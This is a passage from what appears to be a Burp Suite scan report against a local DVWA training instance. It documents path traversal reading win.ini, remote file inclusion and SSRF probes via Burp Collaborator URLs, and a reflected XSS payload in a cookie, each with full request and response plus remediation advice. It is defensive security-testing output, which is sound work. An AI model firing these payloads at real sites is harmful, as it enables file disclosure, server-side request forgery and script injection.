<li><a href="https://cwe.mitre.org/data/definitions/23.html">CWE-23: Relative Path Traversal</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/35.html">CWE-35: Path Traversal: '.../...//'</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/36.html">CWE-36: Absolute Path Traversal</a></li>
	<li><a href="https://capec.mitre.org/data/definitions/126.html">CAPEC-126: Path Traversal</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=<span class="HIGHLIGHT">..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:20 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3226<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br><span class="HIGHLIGHT">; for 16-bit app support</span><br><span class="HIGHLIGHT">[fonts]</span><br><span class="HIGHLIGHT">[extensions]</span><br><span class="HIGHLIGHT">[mci extensions]</span><br><span class="HIGHLIGHT">[files]</span><br>[Mail]<br>MAPI=1<br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="23.2">23.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100a00_outofbandresourceloadhttp">Out-of-band resource load (HTTP)</a></span>
<br><a class="PREVNEXT" href="#23.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">It is possible to induce the application to retrieve the contents of an arbitrary external URL and return those contents in its own response.<br><br>The payload <b>http://c0dgprduqm63i7986n6x0uteu50zoqcg07nxbm.burpcollaborator.net/?include.php</b> was submitted in the <b>page</b> parameter.<br><br>The application performed an HTTP request to the specified domain. The response from that request was then included in the application's own response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Out-of-band resource load arises when it is possible to induce an application to fetch content from an arbitrary external location, and incorporate that content into the application's own response(s). The ability to trigger arbitrary out-of-band resource load does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. 
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to request and retrieve web content from other systems can allow the application server to be used as a two-way attack proxy. 
  By submitting suitable payloads, an attacker can cause the application server to attack, or retrieve content from, other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>
<p>Additionally, the application's processing of web content that is retrieved from arbitrary URLs exposes some important and non-conventional attack surface. 
  An attacker can deploy a web server that returns malicious content, and then induce the application to retrieve and process that content. 
  This processing might give rise to the types of input-based vulnerabilities that are normally found when unexpected input is submitted directly in requests to the application. 
  The out-of-band attack surface that the application exposes should be thoroughly tested for these types of vulnerabilities. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary out-of-band resource load is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. 
You should also ensure that content retrieved from other systems is processed in a safe manner, with the usual precautions that are applicable when processing input from direct incoming web requests.</p>
<p>If the ability to trigger arbitrary out-of-band resource load is not intended behavior, then you should implement a whitelist of permitted URLs, and block requests to URLs that do not appear on this whitelist.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
  <li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li>
  <li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li>
  <li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/610.html">CWE-610: Externally Controlled Reference to a Resource in Another Sphere</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=<span class="HIGHLIGHT">http%3a%2f%2fc0dgprduqm63i7986n6x0uteu50zoqcg07nxbm.burpcollaborator.net%2f%3finclude.php</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ii1m7vi1lgrkepbtn9j2pb5iip<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3195<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;html&gt;&lt;body&gt;<span class="HIGHLIGHT">wz3gv5k894wjtp7s2mplctzjmgjgigjfigz</span>&lt;/body&gt;&lt;/html&gt;&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerabili<br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator HTTP interaction</h2>
<span class="TEXT">The Collaborator server received an HTTP request.<br><br> The request was received from IP address 49.228.238.103 at 2022-Mar-11 07:32:20 UTC.</span><h4>Request to Collaborator</h4>
<div class="rr_div"><span>GET /?include.php HTTP/1.1<br>Host: <span class="HIGHLIGHT">c0dgprduqm63i7986n6x0uteu50zoqcg07nxbm.burpcollaborator.net</span><br>X-Cnection: close<br><br></span></div>
<h4>Response from Collaborator</h4>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Server: Burp Collaborator https://burpcollaborator.net/<br>X-Collaborator-Version: 4<br>Content-Type: text/html<br>Content-Length: 61<br><br>&lt;html&gt;&lt;body&gt;<span class="HIGHLIGHT">wz3gv5k894wjtp7s2mplctzjmgjgigjfigz</span>&lt;/body&gt;&lt;/html&gt;</span></div>
<div class="rule"></div>
<span class="BODH1" id="23.3">23.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300200_externalserviceinteractiondns">External service interaction (DNS)</a></span>
<br><a class="PREVNEXT" href="#23.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>https://sa6wz7na02gjsnjog3gdaa3u4lafygm7ayxold.burpcollaborator.net/?file3.php</b> was submitted in the <b>page</b> parameter.<br><br>The application performed a DNS lookup of the specified domain.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, and these are reported as separate issues. 
  If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, 
  then this strongly indicates that the application attempted to connect using that other service, 
  but was prevented from doing so by egress filters in place at the network layer. The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
  <li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li>
 <li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li>
  <li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=<span class="HIGHLIGHT">https%3a%2f%2fsa6wz7na02gjsnjog3gdaa3u4lafygm7ayxold.burpcollaborator.net%2f%3ffile3.php</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=np9qgntc28sed96ai0a7u01guu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3195<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;html&gt;&lt;body&gt;wz3gv5k894wjtp7s2mplctzjmgtgjgjfigz&lt;/body&gt;&lt;/html&gt;&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerabili<br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator DNS interaction</h2>
<span class="TEXT">The Collaborator server received a DNS lookup of type A for the domain name <b>sa6wz7na02gjsnjog3gdaa3u4lafygm7ayxold.burpcollaborator.net</b>.<br><br> The lookup was received from IP address 49.231.105.252 at 2022-Mar-11 07:32:54 UTC.</span><div class="rule"></div>
<span class="BODH1" id="23.4">23.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300210_externalserviceinteractionhttp">External service interaction (HTTP)</a></span>
<br><a class="PREVNEXT" href="#23.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.5">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">It is possible to induce the application to perform server-side HTTP and HTTPS requests to arbitrary domains.<br><br>The payload <b>http://jbyn0yo11thatekfhuh4b14l5cb6z7nxboyem3.burpcollaborator.net/?file3.php</b> was submitted in the <b>page</b> parameter.<br><br>The application performed an HTTP request to the specified domain.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
  <li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li>
  <li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li>
  <li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=<span class="HIGHLIGHT">http%3a%2f%2fjbyn0yo11thatekfhuh4b14l5cb6z7nxboyem3.burpcollaborator.net%2f%3ffile3.php</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=np9qgntc28sed96ai0a7u01guu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:57 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3195<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;html&gt;&lt;body&gt;wz3gv5k894wjtp7s2mplctzjmgtgigjfigz&lt;/body&gt;&lt;/html&gt;&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerabili<br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator HTTP interaction</h2>
<span class="TEXT">The Collaborator server received an HTTP request.<br><br> The request was received from IP address 49.228.238.103 at 2022-Mar-11 07:33:04 UTC.</span><h4>Request to Collaborator</h4>
<div class="rr_div"><span>GET /?file3.php HTTP/1.1<br>Host: <span class="HIGHLIGHT">jbyn0yo11thatekfhuh4b14l5cb6z7nxboyem3.burpcollaborator.net</span><br>X-Cnection: close<br><br></span></div>
<h4>Response from Collaborator</h4>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Server: Burp Collaborator https://burpcollaborator.net/<br>X-Collaborator-Version: 4<br>Content-Type: text/html<br>Content-Length: 61<br><br>&lt;html&gt;&lt;body&gt;wz3gv5k894wjtp7s2mplctzjmgtgigjfigz&lt;/body&gt;&lt;/html&gt;</span></div>
<div class="rule"></div>
<span class="BODH1" id="23.5">23.5.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#23.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.6">Next</a>
<br>
<br><span class="TEXT">There are 3 instances of this issue:
<ul>
<li><a href="#23.5.1">/dvwa/vulnerabilities/fi/ [security cookie]</a></li>
<li><a href="#23.5.2">/dvwa/vulnerabilities/fi/ [Referer HTTP header]</a></li>
<li><a href="#23.5.3">/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="23.5.1">23.5.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [security cookie]</span>
<br><a class="PREVNEXT" href="#22.4.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.5.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>gusg1'&gt;&lt;script&gt;alert(1)&lt;/script&gt;puwpy</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">gusg1'%3e%3cscript%3ealert(1)%3c%2fscript%3epuwpy</span>; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:23 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=ic77v7ifnktm92p700m44fh7i4; path=/<br>Set-Cookie: security=low<br>Content-Length: 4157<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=fi&amp;security=low<span class="HIGHLIGHT">gusg1'&gt;&lt;script&gt;alert(1)&lt;/script&gt;puwpy</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="23.5.2">23.5.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [Referer HTTP header]</span>
<br><a class="PREVNEXT" href="#23.5.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.5.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
